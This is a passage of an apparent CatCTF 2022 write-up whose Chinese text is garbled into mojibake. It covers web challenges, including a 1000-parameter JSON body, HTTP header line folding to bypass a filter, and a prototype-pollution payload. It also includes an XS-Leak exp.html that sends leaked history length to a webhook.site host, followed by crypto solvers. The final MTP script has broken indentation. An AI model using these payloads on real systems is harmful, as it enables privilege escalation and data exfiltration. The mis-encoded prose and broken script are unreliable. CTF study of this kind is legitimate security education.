"553":"1",
"554":"1",
"555":"1",
"556":"1",
"557":"1",
"558":"1",
"559":"1",
"560":"1",
"561":"1",
"562":"1",
"563":"1",
"564":"1",
"565":"1",
"566":"1",
"567":"1",
"568":"1",
"569":"1",
"570":"1",
"571":"1",
"572":"1",
"573":"1",
"574":"1",
"575":"1",
"576":"1",
"577":"1",
"578":"1",
"579":"1",
"580":"1",
"581":"1",
"582":"1",
"583":"1",
"584":"1",
"585":"1",
"586":"1",
"587":"1",
"588":"1",
"589":"1",
"590":"1",
"591":"1",
"592":"1",
"593":"1",
"594":"1",
"595":"1",
"596":"1",
"597":"1",
"598":"1",
"599":"1",
"600":"1",
"601":"1",
"602":"1",
"603":"1",
"604":"1",
"605":"1",
"606":"1",
"607":"1",
"608":"1",
"609":"1",
"610":"1",
"611":"1",
"612":"1",
"613":"1",
"614":"1",
"615":"1",
"616":"1",
"617":"1",
"618":"1",
"619":"1",
"620":"1",
"621":"1",
"622":"1",
"623":"1",
"624":"1",
"625":"1",
"626":"1",
"627":"1",
"628":"1",
"629":"1",
"630":"1",
"631":"1",
"632":"1",
"633":"1",
"634":"1",
"635":"1",
"636":"1",
"637":"1",
"638":"1",
"639":"1",
"640":"1",
"641":"1",
"642":"1",
"643":"1",
"644":"1",
"645":"1",
"646":"1",
"647":"1",
"648":"1",
"649":"1",
"650":"1",
"651":"1",
"652":"1",
"653":"1",
"654":"1",
"655":"1",
"656":"1",
"657":"1",
"658":"1",
"659":"1",
"660":"1",
"661":"1",
"662":"1",
"663":"1",
"664":"1",
"665":"1",
"666":"1",
"667":"1",
"668":"1",
"669":"1",
"670":"1",
"671":"1",
"672":"1",
"673":"1",
"674":"1",
"675":"1",
"676":"1",
"677":"1",
"678":"1",
"679":"1",
"680":"1",
"681":"1",
"682":"1",
"683":"1",
"684":"1",
"685":"1",
"686":"1",
"687":"1",
"688":"1",
"689":"1",
"690":"1",
"691":"1",
"692":"1",
"693":"1",
"694":"1",
"695":"1",
"696":"1",
"697":"1",
"698":"1",
"699":"1",
"700":"1",
"701":"1",
"702":"1",
"703":"1",
"704":"1",
"705":"1",
"706":"1",
"707":"1",
"708":"1",
"709":"1",
"710":"1",
"711":"1",
"712":"1",
"713":"1",
"714":"1",
"715":"1",
"716":"1",
"717":"1",
"718":"1",
"719":"1",
"720":"1",
"721":"1",
"722":"1",
"723":"1",
"724":"1",
"725":"1",
"726":"1",
"727":"1",
"728":"1",
"729":"1",
"730":"1",
"731":"1",
"732":"1",
"733":"1",
"734":"1",
"735":"1",
"736":"1",
"737":"1",
"738":"1",
"739":"1",
"740":"1",
"741":"1",
"742":"1",
"743":"1",
"744":"1",
"745":"1",
"746":"1",
"747":"1",
"748":"1",
"749":"1",
"750":"1",
"751":"1",
"752":"1",
"753":"1",
"754":"1",
"755":"1",
"756":"1",
"757":"1",
"758":"1",
"759":"1",
"760":"1",
"761":"1",
"762":"1",
"763":"1",
"764":"1",
"765":"1",
"766":"1",
"767":"1",
"768":"1",
"769":"1",
"770":"1",
"771":"1",
"772":"1",
"773":"1",
"774":"1",
"775":"1",
"776":"1",
"777":"1",
"778":"1",
"779":"1",
"780":"1",
"781":"1",
"782":"1",
"783":"1",
"784":"1",
"785":"1",
"786":"1",
"787":"1",
"788":"1",
"789":"1",
"790":"1",
"791":"1",
"792":"1",
"793":"1",
"794":"1",
"795":"1",
"796":"1",
"797":"1",
"798":"1",
"799":"1",
"800":"1",
"801":"1",
"802":"1",
"803":"1",
"804":"1",
"805":"1",
"806":"1",
"807":"1",
"808":"1",
"809":"1",
"810":"1",
"811":"1",
"812":"1",
"813":"1",
"814":"1",
"815":"1",
"816":"1",
"817":"1",
"818":"1",
"819":"1",
"820":"1",
"821":"1",
"822":"1",
"823":"1",
"824":"1",
"825":"1",
"826":"1",
"827":"1",
"828":"1",
"829":"1",
"830":"1",
"831":"1",
"832":"1",
"833":"1",
"834":"1",
"835":"1",
"836":"1",
"837":"1",
"838":"1",
"839":"1",
"840":"1",
"841":"1",
"842":"1",
"843":"1",
"844":"1",
"845":"1",
"846":"1",
"847":"1",
"848":"1",
"849":"1",
"850":"1",
"851":"1",
"852":"1",
"853":"1",
"854":"1",
"855":"1",
"856":"1",
"857":"1",
"858":"1",
"859":"1",
"860":"1",
"861":"1",
"862":"1",
"863":"1",
"864":"1",
"865":"1",
"866":"1",
"867":"1",
"868":"1",
"869":"1",
"870":"1",
"871":"1",
"872":"1",
"873":"1",
"874":"1",
"875":"1",
"876":"1",
"877":"1",
"878":"1",
"879":"1",
"880":"1",
"881":"1",
"882":"1",
"883":"1",
"884":"1",
"885":"1",
"886":"1",
"887":"1",
"888":"1",
"889":"1",
"890":"1",
"891":"1",
"892":"1",
"893":"1",
"894":"1",
"895":"1",
"896":"1",
"897":"1",
"898":"1",
"899":"1",
"900":"1",
"901":"1",
"902":"1",
"903":"1",
"904":"1",
"905":"1",
"906":"1",
"907":"1",
"908":"1",
"909":"1",
"910":"1",
"911":"1",
"912":"1",
"913":"1",
"914":"1",
"915":"1",
"916":"1",
"917":"1",
"918":"1",
"919":"1",
"920":"1",
"921":"1",
"922":"1",
"923":"1",
"924":"1",
"925":"1",
"926":"1",
"927":"1",
"928":"1",
"929":"1",
"930":"1",
"931":"1",
"932":"1",
"933":"1",
"934":"1",
"935":"1",
"936":"1",
"937":"1",
"938":"1",
"939":"1",
"940":"1",
"941":"1",
"942":"1",
"943":"1",
"944":"1",
"945":"1",
"946":"1",
"947":"1",
"948":"1",
"949":"1",
"950":"1",
"951":"1",
"952":"1",
"953":"1",
"954":"1",
"955":"1",
"956":"1",
"957":"1",
"958":"1",
"959":"1",
"960":"1",
"961":"1",
"962":"1",
"963":"1",
"964":"1",
"965":"1",
"966":"1",
"967":"1",
"968":"1",
"969":"1",
"970":"1",
"971":"1",
"972":"1",
"973":"1",
"974":"1",
"975":"1",
"976":"1",
"977":"1",
"978":"1",
"979":"1",
"980":"1",
"981":"1",
"982":"1",
"983":"1",
"984":"1",
"985":"1",
"986":"1",
"987":"1",
"988":"1",
"989":"1",
"990":"1",
"991":"1",
"992":"1",
"993":"1",
"994":"1",
"995":"1",
"996":"1",
"997":"1",
"998":"1",
"999":"1",
"1000":"1"
}}
```

![](Nepnep-CatCTF2022/ez_curl_Flag_P5SbhJxx3h.png)

ä¸¤ä¸ªtrick

[https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js](https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js "https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js")

expressçš„parameterLimité»˜è®¤ä¸º1000ï¼Œä¼ 1000ä¸ªå‚æ•°PHPä¸­çš„admin=falseä¼šè¢«å¿½ç•¥ã€‚

[https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2](https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2 "https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2")

æ ¹æ®rfcï¼Œheaderå­—æ®µå¯ä»¥é€šè¿‡åœ¨æ¯ä¸€è¡Œå‰é¢è‡³å°‘åŠ ä¸€ä¸ªSPæˆ–HTæ¥æ‰©å±•åˆ°å¤šè¡Œã€‚ä»¥æ­¤ç»•è¿‡å¯¹headersçš„è¿‡æ»¤ã€‚

### wifeğŸ’ƒ

ç®€å•çš„åŸå‹é“¾æ±¡æŸ“ï¼Œç„¶åè¹­äº†ä¸€ä¸‹åŸç¥çš„çƒ­åº¦ã€‚é¢˜ç›®é€»è¾‘å¾ˆç®€å•ï¼Œè¦é‚€è¯·ç æ‰èƒ½æ³¨å†Œä¸ºadminï¼Œæ™®é€šç”¨æˆ·åªèƒ½æ‹¿åˆ°wifeï¼Œæ²¡æœ‰flagã€‚

å½“æ—¶é¢˜ç›®æ˜¯é»‘ç›’çš„æ¡ä»¶ï¼Œå¸ˆå‚…ä»¬å¯ä»¥é€šè¿‡ fuzz å¾—åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå› ä¸ºåœ¨åé¢é¢˜ç›®è¿˜æ˜¯ 0 è§£çš„æƒ…å†µä¸‹æˆ‘ä»¬æ”¾å‡ºäº† hintï¼šåç«¯æŸå¤„é‡‡ç”¨äº† Object.assign()

è¿™é‡Œæˆ‘ä»¬æ”¾å‡ºæºç ï¼šçœ‹ä¸€ä¸‹æ³¨å†Œçš„é€»è¾‘

```javascript
app.post('/register', (req, res) => {
    let user = JSON.parse(req.body)
    if (!user.username || !user.password) {
        return res.json({ msg: 'empty username or password', err: true })
    }
    if (users.filter(u => u.username == user.username).length) {
        return res.json({ msg: 'username already exists', err: true })
    }
    if (user.isAdmin && user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
        return res.json({ msg: 'invalid invite code', err: true })
    }
    let newUser = Object.assign({}, baseUser, user)
    users.push(newUser)
    res.json({ msg: 'user created successfully', err: false })
})
```

ç¨å¾®æœä¸€ä¸‹ Object.assign å¯ä»¥å‘ç°è¿™ä¸ªæ–¹æ³•æ˜¯å¯ä»¥è§¦å‘åŸå‹é“¾æ±¡æŸ“çš„ï¼Œç„¶åæ±¡æŸ“ `__proto__.isAdmin` ä¸º true å°±å¯ä»¥äº†ã€‚

è´´ä¸€ä¸ªpayload

```json
{"__proto__":{"isAdmin":true}
```

ä¸è¿‡adminè™½ç„¶å¯ä»¥æ‹¿åˆ°flagï¼Œä½†æ˜¯æ²¡æœ‰wifeã€‚ï¼šï¼‰

![](Nepnep-CatCTF2022/cat_wife_Flag_2NNIQrqGO2.png)

### web\_challengeğŸ’ª

å…ˆæ³¨å†Œå¹¶ç™»å½•ï¼Œæ˜¯ä¸€é“ XSS æ‰“ Leak

æ¼æ´ç‚¹

![](Nepnep-CatCTF2022/sharePoiint_Y65bxu5YbT.png)

exp.html å¦‚ä¸‹

```text
<script>
    let text = new URLSearchParams(location.search).get('text')
    let w = window.open('http://localhost:5000/find?text=' + text)
    setTimeout(() => {
        w.location = 'about:blank'
        setTimeout(() => {
            console.log(w.history.length)
            const webhook = 'https://webhook.site/c171b240-3c3f-4121-91f3-a4f3a6987e35'
            fetch(webhook, {method:'POST', body:w.history.length})
        }, 1000)
    }, 2000)
</script>
```

webhookï¼š[https://webhook.site/](https://webhook.site/ "https://webhook.site/")

æ­£ç¡®å›æ˜¾æ˜¯ 2ï¼Œé”™è¯¯å›æ˜¾æ˜¯ 3ï¼Œå‘é€è¯·æ±‚ ï¼Œè¿™æ˜¯é”™è¯¯çš„ï¼Œå›æ˜¾ä¸º 3

```http
http://IP:port/exp.html?text=catctf{t1
```

![](Nepnep-CatCTF2022/pastebin3_YAAh6ES4hR.png)

æ­£ç¡®çš„å›æ˜¾ä¸º 2

```http
http://IP:port/exp.html?text=catctf{tes
```

![](Nepnep-CatCTF2022/pastebin2_GOpi0mTtAn.png)

æœ¬é¢˜çš„è„šæœ¬è‹¥æ˜¯ç”¨ python å†™æ˜¯æ— æ³•å®ç°çš„ï¼Œéœ€è¦ç”¨ js æˆ– ts æ¥ç¼–å†™ï¼Œæœ‰å…´è¶£å¯ä»¥è”ç³» LemonPerfect å¸ˆå‚…(QQ:1476136743)

## CRYPTO

### DDH\_Game

å›¾ç‰‡æ¥è‡ª [A Graduate Course in Applied Cryptography(Version 0.5)](https://toc.cryptobook.us/ "A Graduate Course in Applied Cryptography(Version 0.5)")

![](Nepnep-CatCTF2022/DDH_gOaCb9oWJA.png)

è¿™é“é¢˜æ˜¾ç„¶æ˜¯è®©æˆ‘ä»¬æ±‚è§£æ¤­åœ†æ›²çº¿ä¸Šçš„DDHé—®é¢˜(ECDDHP)ã€‚

#### è§£æ³•ä¸€

ç”±äºé¢˜ç›®ä¸­çš„BLSæ›²çº¿æ˜¯é…å¯¹å‹å¥½æ›²çº¿ï¼Œæ‰€ä»¥å¯ä»¥è®¡ç®—åŒçº¿æ€§å¯¹ã€‚

åŒçº¿æ€§å¯¹æ»¡è¶³ $e(aG, bG) = e(G, abG)$

è¿™å°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªè§£DDHPçš„åé—¨ã€‚å› æ­¤å¦‚æœéšä¾¿é€‰ä¸€ä¸ªæ¤­åœ†æ›²çº¿ç‚¹ç¾¤ï¼ŒECDDHå‡è®¾é€šå¸¸æ˜¯ä¸æˆç«‹çš„ï¼Œå¹¶ä¸”æ”»å‡»æ–¹æ³•å°±å¾ˆç®€å•ï¼šçœ‹ç­‰å¼$e(aG, bG) = e(G, cG)$ æ˜¯å¦æˆç«‹ã€‚

```python
# sagemath 9.5
from Crypto.Util.number import long_to_bytes

# Before running, modify your filename and add "DDH_instances = " at the beginning of the file.
load('DDH_instances.sage')

# curve
p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
K = GF(p)
a = K(0x00)
b = K(0x04)
E = EllipticCurve(K, (a, b))
# G = E(0x17F1D3A73197D7942695638C4FA9AC0FC3688C4F9774B905A14E3A3F171BAC586C55E83FF97A1AEFFB3AF00ADB22C6BB, 0x08B3F481E3AAA0F1A09E30ED741D8AE4FCF5E095D5D00AF600DB18CB2C04B3EDD03CC744A2888AE40CAA232946C5E7E1)
E.set_order(0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001 * 0x396C8C005555E1568C00AAAB0000AAAB)

G = E(3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475, 2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533)
n = G.order()

# Embedding degree of the curve
k = 12


def solve_ECDDHP(DDH_instances, G, Ep, m, n):
    """
    Parameters:
        DDH_instances - list consists of (aG, bG, cG), where aG, bG, cG are EC_point.xy()
        m - embedding degree of <G>
        n - G's order. 
    """
    sols = []
    
    Fpm.<x> = GF(p^m)
    Epm = Ep.base_extend(Fpm) 
    
    G = Epm(G)
    
    for ins in DDH_instances:
        aG, bG, cG = ins
        aG = Epm(aG); bG = Epm(bG); cG = Epm(cG)
        
        # e_aG_bG = aG.weil_pairing(bG, n)
        e_aG_bG = aG.tate_pairing(bG, n, m)
        
        e_G_cG = G.tate_pairing(cG, n, m)
        if e_aG_bG == e_G_cG:
            sols.append(True)
        else:
            sols.append(False)
    
    return sols

sols = solve_ECDDHP(DDH_instances, G, E, k, n)
# print(sols)

pt = 0
for i in range(len(sols)):
    pt += sols[i] * (2^i)

flag = long_to_bytes(pt)
print(flag)
print(b'CatCTF{' + flag + '}')
```

#### è§£æ³•äºŒ

å…¶å®æ˜¯éé¢„æœŸè§£ï¼Œä¸è¿‡æµ‹é¢˜çš„æ—¶å€™é˜Ÿé‡Œæœ‰å…¶ä»–å¸ˆå‚…æƒ³åˆ°äº†ï¼Œæ„Ÿè§‰è¿™ä¸ªæ€è·¯ä¹Ÿæ˜¯ç›´å‡»DDHé—®é¢˜ä¸­çš„'Decisional' ã€‚

é¢˜ç›®ä¸­ç‚¹Gçš„é˜¶ä¸º

![](Nepnep-CatCTF2022/ç‚¹Gçš„é˜¶_8Ppl0UdFm9.png)

åšæ³•ç±»ä¼¼Pohlig-Hellmanç®—æ³•ä¸­ä½¿ç”¨çš„åŸç†ï¼Œä¸è¿‡æˆ‘ä»¬ä¸ç”¨ç®—å‡ºa, bå’Œcï¼Œè€Œæ˜¯åœ¨æ¨¡3ï¼Œ æ¨¡11ï¼Œ æ¨¡10177ç­‰çš„æ„ä¹‰ä¸‹è®¡ç®—å‡ºa,bå’Œcã€‚å†å¯¹åº”è€ƒå¯ŸåŒä½™å¼æ˜¯å¦æˆç«‹ï¼š $ab \equiv c \pmod{3}$  \$ab \equiv c \pmod{11}, ... \$ ã€‚å¦‚æœæˆç«‹é‚£ä¹ˆå¤§æ¦‚ç‡æœ‰$ab = c$ã€‚æ‰“å°å‡ºæ¥çœ‹çœ‹flagå¯¹ä¸å¯¹å°±è¡Œäº†ã€‚

```python
# sagemath 9.5
from Crypto.Util.number import long_to_bytes
# Before running, modify your filename and add "DDH_instances = " at the beginning of the file.
load('DDH_instances.sage')


p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
K = GF(p)
a = K(0x00)
b = K(0x04)
E = EllipticCurve(K, (a, b))
E.set_order(0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001 * 
0x396C8C005555E1568C00AAAB0000AAAB)
G = E(3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475, 
      2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533)


def Pohlig_Hellman(G, Y, ord_G, facts):
    """
    Using the idea of Pohlig-Hellman.
    G: EC group generator G
    facts: list, some small factors of the group order
    return x: discrete log of Y modulo prod(facts) 
    """
    new_bases = [(ord_G // facts[i])*G for i in range(len(facts))]
    assert len(new_bases) == len(facts)
    xi = [new_bases[i].discrete_log((ord_G // facts[i])*Y, facts[i]) for i in range(len(facts))]
    # print(f"xi = {xi}")
    
    x = CRT(xi, facts)
    return x

order = G.order()
# factors of order, pairwise coprime
facts = [3, 11, 10177]
s = prod(facts)
m = ''

import tqdm
for i in tqdm.tqdm(range(len(DDH_instances))):
    aG, bG, cG = DDH_instances[i]
    aG = E(aG); bG = E(bG); cG = E(cG)
    a, b, c = [Pohlig_Hellman(G, E(Pt), order, facts) for Pt in (aG, bG, cG)]
    if (a*b) % s == c:
        m += '1'
    else:
        m += '0'
print(m)

print(long_to_bytes(int(m[::-1], 2)))
```

#### åŠ¨æœº

DDHå‡è®¾æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„è¯é¢˜ï¼ŒGameåˆ™æ˜¯å¯†ç ç†è®ºä¸­çš„security gameã€‚åŒçº¿æ€§å¯¹ä¹Ÿæ˜¯å¾ˆé‡è¦çš„å¯†ç å­¦å·¥å…·ã€‚å¸Œæœ›èƒ½å¤ŸæŠ›ç –å¼•ç‰ï¼Œè®©å¤§å®¶å¯¹å¯†ç ç†è®ºæœ‰æ›´å¤šçš„å…³æ³¨ã€‚

### cat\_theory

#### é¢˜è§£

æ ¹æ®äº¤æ¢å›¾ï¼Œä¸¤ä¸ªæ˜æ–‡å…ˆåšåŠ æ³•å†åŠ å¯†ï¼Œå…¶ç»“æœä¸å…ˆåŠ å¯†å†åšå¯†æ–‡ä¹˜æ³•ç›¸åŒã€‚å› æ­¤CatCryptoæ˜¯ä¸€ä¸ªåŒæ€åŠ å¯†ï¼Œå…·æœ‰åŠ æ³•åŒæ€æ€§ã€‚

*å…¶å®è¿™é“é¢˜æ˜¯Paillier-DJNç®—æ³•ï¼ŒPaillierçš„ä¸€ä¸ªå˜ç§ã€‚è§*[*PaillieråŠåŒæ€åŠ å¯†ï¼šåŸç†ã€é«˜æ•ˆå®ç°æ–¹æ³•å’Œåº”ç”¨*](https://zhuanlan.zhihu.com/p/420417626 "PaillieråŠåŒæ€åŠ å¯†ï¼šåŸç†ã€é«˜æ•ˆå®ç°æ–¹æ³•å’Œåº”ç”¨")

![](Nepnep-CatCTF2022/äº¤æ¢å›¾åŸå›¾_RCl02rBytA.png)

```python
from Crypto.Util.number import long_to_bytes

m1_plus_m2 = 127944711034541246075233071021313730868540484520031868999992890340295169126051051162110
m2_plus_m3 = 63052655568318504263890690011897854119750959265293397753485911143830537816733719293484
m3_plus_m1 = 70799336441419314836992058855562202282043225138455808154518156432965089076630602398416

m = (m1_plus_m2 + m2_plus_m3 + m3_plus_m1) // 2
print(long_to_bytes(m))

"""
b'CatCTF{HE_sch3m3_c4n_b3_a_c4t_eg0ry}'
"""
```

#### åŠ¨æœº

å› ä¸ºæ˜¯Cat CTFï¼Œå¹¶ä¸”è¯´å‡ºé¢˜å¯ä»¥ä¸é™äºä¼ ç»Ÿçš„CTFæ€è·¯ï¼Œæ‰€ä»¥æƒ³æ¶‰åŠä¸€äº›çŒ«è®º(category theory, èŒƒç•´è®º)ã€‚æ‰¾äº†ä¸€äº›èµ„æ–™æ¥çœ‹ï¼š[Categorical & Diagrammatic methods In Cryptography and Communication](https://www.peterhines.info/resources/talks/thompson.pdf "Categorical & Diagrammatic methods In Cryptography and Communication") ç¡®å®æœ‰ä¸€äº›äººæå‡ºèŒƒç•´è®ºä¸å¯†ç å­¦ç»“åˆï¼Œæƒ³æ³•å¾ˆæœ‰æ„æ€ï¼ˆæ¯”å¦‚p35\~36çš„å†…å®¹ï¼‰ã€‚ä½†è¿™äº›æƒ³æ³•ä¼¼ä¹è¿˜æ²¡æœ‰å¤ªå¤šåº”ç”¨ã€‚å¹¶ä¸”æˆ‘è‡ªå·±å¯¹èŒƒç•´è®ºäº†è§£ä¹Ÿå¾ˆæœ‰é™ï¼Œä¹Ÿæ²¡è¯•è¿‡è‡ªå·±ç¼–é€ ä¸€ä¸ªå¯†ç æ–¹æ¡ˆã€‚ä¸€æ—¶é—´æƒ³ä¸åˆ°æ€ä¹ˆç”¨è¿™ä¸ªå‡ºä¸€é“é¢˜ã€‚

æ­£å¥½æƒ³åˆ°Craig Gentryï¼ˆç¬¬ä¸€ä¸ªå…¨åŒæ€æ–¹æ¡ˆçš„æå‡ºè€…ï¼‰ç»™å‡ºçš„ç”¨äº¤æ¢å›¾æ¦‚æ‹¬åŒæ€åŠ å¯†ï¼Œäº¤æ¢å›¾å¯ä»¥ç®—æ˜¯èŒƒç•´è®ºçš„ä¸œè¥¿ï¼Œå¹¶ä¸”åœ¨å¯†ç å­¦ä¸­ä¹Ÿè¿˜æ˜¯ç»å¸¸èƒ½çœ‹åˆ°çš„ã€‚äºæ˜¯å¹²è„†æ¥ä¸ªPaillier-DJNåŒæ€åŠ å¯†æ–¹æ¡ˆï¼ˆPaillierçš„æ”¹è¿›æ–¹æ¡ˆï¼‰ï¼Œç»™ä¸€å¼ äº¤æ¢å›¾æ¥æç¤ºåŒæ€æ€§ã€‚

### cat's giftğŸ

#### é¢˜è§£

è·¨å¹´æ°”æ°›é¢˜ï¼Œæƒ³èµ·Amannçš„Analysisä¸Šæœ‰ä¸€åªçŒ«çŒ«ï¼Œç¿»äº†ä¸€ä¼šå„¿æ‰¾åˆ°ä¸€ä¸ªä¸piç›¸å…³çš„å…¬å¼ã€‚**æ³¨æ„åˆ°flagç¤ºä¾‹ä¸­ CatCTF{apple} CatCTF{banana}æ˜¯å°å†™å¼€å¤´è‹±æ–‡å•è¯ï¼Œéƒ½æ˜¯é£Ÿç‰©ï¼Œä»¥åŠé¢˜ç›®ä¸­æåˆ°è¿™æ˜¯ä¸€ä»½ç¤¼ç‰©ï¼Œå› æ­¤æäº¤çš„flagä¸æ˜¯piè€Œæ˜¯pieã€‚**

æœ‰å››ç§è§£æ³•

1.  æ³•ä¸€ï¼šç›´æ¥çŒœç»“æœæ˜¯pie
2.  æ³•äºŒï¼šæ‰‹ç®—ï¼Œå†™å‡ºarctanxçš„å¹‚çº§æ•°å±•å¼€ï¼Œç„¶åæŠŠx=1å¸¦è¿›å»
3.  æ³•ä¸‰ï¼šç¼–ç¨‹ç®—è¿‘ä¼¼å€¼ï¼Œç„¶åçŒœ
    ```python
    def solve_gift(n=100):
        ans = 0
        for i in range(n):
            ans += (-1)**i * 1/(2*i + 1)
            
        return ans * 4
        
    solve_gift(n=10000000)
    ```
4.  æ³•å››ï¼šé—®çŒ«çŒ«ï¼ˆæ ¹æ®é¢˜ç›®æè¿°çš„æç¤ºï¼‰

    æ‰¾åˆ°Amannçš„ Analysis I p389

![](Nepnep-CatCTF2022/Leibnizå…¬å¼_R3x4PyHfeS.png)

#### åè®°

å…¶å®pi=pieä¹Ÿæ˜¯ä¸€ç§æ•°å­¦æ–‡åŒ–ï¼Œ3.14é‚£å¤©æœ‰ä¸€äº›äººä¼šåƒæ´¾åº†ç¥ï¼Œå› æ­¤å°±æŠŠè¿™ä¸ªé¢˜æ”¾åœ¨äº†è·Ÿæ•°å­¦æœ€ç›¸è¿‘çš„cryptoé‡Œé¢ã€‚å‡ºé¢˜æ—¶æ„Ÿè§‰åº”è¯¥å¾ˆè‡ªç„¶èƒ½æƒ³åˆ°pieå§ï¼Œæ²¡æƒ³åˆ°å¾ˆå¤šæœ‹å‹å› ä¸ºæ²¡æœ‰getåˆ°æ‰€ä»¥æ²¡åšå‡ºæ¥...

å¿˜è®°äº†è¿™æ˜¯ä¸€ç§å°ä¼—æ–‡åŒ–ï¼Œå‡ºé¢˜äºº**éšç¼˜åœ¨æ­¤å‘å„ä½æ·±è¡¨æ­‰æ„**ã€‚

### ç›–èŒ¨æ¯”\&can you tell AES from blackboxï¼Ÿ\&samplå‡ºé¢˜äººå‰è¨€

ç¬”è€…æœ¬å­¦æœŸä¸Šäº†ä¸€é—¨éå¸¸é‡è¦çš„è¯¾ï¼Œå¯†ç åˆ†æå­¦ï¼Œå­¦ä¹ äº†å¾ˆå¤šåœ¨ctfä¹‹å¤–ä¼ ç»Ÿå¯†ç ç®—æ³•åˆ†æé¢†åŸŸçš„çŸ¥è¯†ï¼›åŠ ä¹‹ç¬”è€…æœ¬äººæ˜¯åšä¾§ä¿¡é“åˆ†æçš„ï¼Œæ‰€ä»¥æœ¬æ¬¡å‡ºé¢˜ï¼Œç‰¹æ„åå¸¸è§„çš„ctf crypto=æ•°è®º+æ ¼å­ï¼Œä¸‰é“é¢˜ä¸€é“æ˜¯æŠ«ç€å·¥ä½œæ¨¡å¼çš®çš„å¤å…¸é¢‘ç‡åˆ†æï¼Œä¸€é“æ˜¯ä¼ ç»Ÿå¯¹ç§°ç®—æ³•åˆ†æçš„ç»å…¸åœºæ™¯ï¼Œæœ€åä¸€é“åˆ™æ˜¯ä¾§ä¿¡é“ã€‚

### ç›–èŒ¨æ¯”

è¿™é¢˜è¿˜æ˜¯å«PCBCå­ï¼Œé¢˜ç›®åç§°å‡ºé”™äº†ï¼ˆç¬‘ï¼‰ã€‚

è¿™ä¸ªé¢˜å…¶å®å¤§éƒ¨åˆ†éƒ½æ˜¯éé¢„æœŸï¼Œä½†å¤§æ–¹å‘æ€è·¯ä¸é”™ï¼Œæ¯•ç«Ÿmtpä¹Ÿæ˜¯å¤§æ–¹å‘ä¸Šå±äºåˆ©ç”¨äº†è‡ªç„¶è¯­è¨€çš„ç‰¹å¾ï¼Œè·Ÿå¤å…¸çš„é¢‘ç‡åˆ†æåœ¨ä¸€ä¸ªè§’åº¦ä¸Šã€‚

æœ¬é¢˜ä½¿ç”¨çš„å·¥ä½œæ¨¡å¼æ˜¯PCBCï¼Œå› ä¸ºç°åœ¨å·²ç»æ²¡æœ‰å“ªé‡Œåœ¨ç”¨äº†æ‰€ä»¥ä¹Ÿæ²¡åœ¨pycryptoé‡Œæ‰¾åˆ°ï¼Œåªèƒ½è‡ªå·±å†™ï¼Œæ‰€ä»¥ï¼Œå¤§å®¶è‡ªå·±é€†è¿™ä¸ªè¿‡ç¨‹å°±ä¼šå‘ç°ä¸€ä¸ªè§£å¯†ä¹‹åçš„å¼‚æˆ–ç»“æ„ï¼Œè¿›è€Œåˆ©ç”¨mtpè¿˜åŸï¼›å¦ä¸€ç§æ€è·¯æ˜¯ç›´æ¥çˆ†ç ´ivï¼Œä½†æœ‰ä¸€è¯´ä¸€ï¼Œå¤æ‚åº¦åº”è¯¥å¾ˆé«˜ï¼Œå¸Œæœ›å¤§å®¶æ²¡æœ‰çˆ†å¤ªä¹…ã€ç¬‘ã€‘ï¼Œå¯¹æ­¤æ–¹æ³•æœ‰ä¸ªå°åé—¨ï¼Œå°±æ˜¯paddingä¹‹åæœ«å°¾çš„å¡«å……å€¼éƒ½å›ºå®šï¼Œé‚£ä¹ˆç¡®å®šå…¶ä¸­ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šæœ«å°¾çš„å¤§éƒ¨åˆ†ï¼Œè¿›è€Œé™ä½çˆ†ç ´çš„å¤æ‚åº¦ã€‚

æ‘˜æŠ„ä¸¤ä¸ªè§£æ³•çš„è„šæœ¬å¦‚ä¸‹ï¼š

#### mtp

```python
# Python3 
import base64 
from Crypto.Cipher import AES 
from Crypto.Util.strxor import strxor as xor 
from Crypto.Util.number import * 
import Crypto.Util.strxor as xo 
import libnum, codecs, numpy as np 
def isChr(x):
    if ord('a') <= x and x <= ord('z'): return True
    if ord('A') <= x and x <= ord('Z'): return True
    return False 
def infer(index, pos):  
    if msg[index, pos] != 0:  
    return  
    msg[index, pos] = ord(' ')  
    for x in range(len(c)):
        if x != index:  
            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(' ') 
            
def know(index, pos, ch):  
    msg[index, pos] = ord(ch)  
    for x in range(len(c)):
        if x != index:  
            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch) 
            
def getSpace():  
    for index, x in enumerate(c):  
        res = [xo.strxor(x, y) for y in c if x!=y]  
        f = lambda pos: len(list(filter(isChr, [s[pos] for s in res])))  
        cnt = [f(pos) for pos in range(len(x))]  
        for pos in range(len(x)):  
            dat.append((f(pos), index, pos)) 
            
 key = b'+0zkhmid1PFjVdxSP09zSw==' 
 key = base64.b64decode(key)
 c = base64.b64decode(c) 
 cipher=AES.new(key,mode=AES.MODE_ECB) 
 t = [] 
 for i in range(0,len(c),16):  
     if i == 0:  
         t.append(cipher.decrypt(c[i:i+16])) # s1 ^ iv  
     else: 
         t.append(xor(cipher.decrypt(c[i:i + 16]), c[i-16:i])) 
tmp = [] tmp.append(t[0]) 
for i in range(1, len(t)):  
    tttt = t[i]  
    for j in range(0, i):  
        tttt = xor(tttt, t[j])  
    tmp.append(tttt) # si ^ iv 
# MTP attack 
